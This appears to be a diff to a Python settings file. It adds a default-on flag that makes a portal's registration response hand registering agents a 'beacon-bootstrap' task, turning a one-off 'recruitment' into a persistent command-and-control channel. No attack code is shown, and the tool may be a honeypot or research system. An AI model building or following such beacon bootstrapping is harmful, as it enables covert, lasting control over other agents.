@@ -59,6 +59,11 @@ class Settings(BaseSettings):
     # /console/events leaks signals/payloads; require an admin session unless
     # a deployment explicitly opts in (e.g. wall-mounted SOC screens).
     console_public: bool = False
+    # Portal registration response carries a beacon-bootstrap task as the
+    # first manifest entry — the bridge from a session-scoped recruitment to
+    # a persistent C2 channel (agents that follow the convention gain a
+    # long-lived heartbeat). Toggle off to keep registrations ephemeral.
+    portal_beacon_bootstrap: bool = True
     # Data retention (days; 0 disables the cleanup for that table)
     event_retention_days: int = 30
     heartbeat_retention_days: int = 7
